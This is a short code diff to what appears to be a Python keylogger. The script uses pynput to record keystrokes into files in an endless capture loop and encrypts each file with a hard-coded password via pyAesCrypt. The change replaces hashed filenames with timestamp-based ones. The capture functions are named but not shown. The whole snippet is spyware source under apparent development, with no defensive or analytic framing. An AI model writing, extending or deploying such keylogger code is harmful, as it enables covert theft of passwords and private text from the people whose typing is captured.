@@ -1,6 +1,5 @@
 import pynput
 import time
-import hashlib
 import pyAesCrypt
 import os
 import argparse
@@ -50,7 +49,7 @@ def Main():
 
     if args.mode == "capture":
         while True:
-            filename = hashlib.sha1(str(time.time()).encode()).hexdigest() + ".txt"
+            filename = str(time.time()).split(".")[0] + ".txt"
             begin_capture()
             record_keystrokes(filename)
             encrypt_file(filename, ENCRYPTION_PASSWORD)
